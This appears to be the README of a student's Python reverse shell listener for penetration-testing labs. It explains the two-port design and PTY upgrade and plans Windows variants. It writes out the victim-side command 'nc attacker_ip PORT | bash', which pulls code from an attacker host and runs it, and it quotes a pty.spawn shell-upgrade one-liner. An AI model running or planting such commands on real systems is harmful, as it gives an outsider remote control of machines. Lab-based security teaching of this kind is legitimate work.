# Reverse Shell Listener

A Python-based reverse shell listener with full TTY support and file transfer capabilities. Built for cybersecurity education and penetration testing labs.

---

## Features

- Full interactive TTY shell (arrow keys, tab completion, Ctrl+C all work)
- Automatic terminal size sync
- Live terminal resize support
- Two-port design (command port + shell port)
- Works across Linux to Linux environments

---

## Requirements

**Attacker machine**
- Python 3
- Linux (uses `termios`, `tty`)

**Victim machine**
- `nc` (netcat)
- `python3` (for PTY spawn)
- `bash`

---

## Usage

### 1. Start the listener on attacker machine

```bash
python3 listener.py
```

You will be prompted for a port number. The tool automatically opens two ports:
- `PORT` — receives initial victim connection
- `PORT+1` — receives the full interactive shell

### 2. On victim machine (or type this through partial access)

```bash
nc attacker_ip PORT | bash
```

That's it. The listener sends the payload automatically and you get a full shell.

---

## How It Works

```
1. Attacker runs listener.py
           ↓
2. Victim runs:  nc attacker_ip PORT | bash
           ↓
3. Listener sends payload to victim automatically
           ↓
4. Victim spawns PTY via python3 pty.spawn
   and calls back to attacker on PORT+1
           ↓
5. Attacker gets full interactive TTY shell
```

### Why Two Ports?

| Port | Purpose |
|------|---------|
| PORT | One-way command injection (victim pulls payload) |
| PORT+1 | Full bidirectional interactive shell |

### Why `pty.spawn` in the Payload?

Piped `bash -i` ignores `stty` because there is no real TTY attached. Using `python3 -c 'import pty; pty.spawn("/bin/bash")'` creates a real PTY on the victim side, so terminal size sync and arrow keys work correctly.

---

## Project Phases

### Phase 1 — Linux to Linux ✅
- Basic TCP listener
- Raw terminal mode
- Terminal size sync
- PTY-based shell upgrade
- File transfer

### Phase 2 — Linux (attacker) → Windows (victim)
- Powershell one-liner on victim
- cmd.exe / powershell shell handling
- Windows file transfer methods

### Phase 3 — Windows (attacker) → Linux (victim)
- Listener adapted for Windows (`msvcrt` instead of `termios`)
- Thread-based stdin handling

### Phase 4 — Windows → Windows
- Full Powershell both sides
- No PTY, alternative upgrade path

---

## Lab Setup

Always test in an isolated environment:

```
VirtualBox / VMware
├── Attacker VM  (Kali Linux)
└── Victim VM    (Ubuntu / Debian)
      Network: Host-Only Adapter
```

Never run on a network you do not own.

---

## File Structure

```
Reverse-Shell/
├── listener.py       # Main attacker-side listener
└── README.md
```

---

## Disclaimer

This tool is built for **educational purposes only** as part of a cybersecurity midterm project. Only use in lab environments on machines you own or have explicit permission to test.
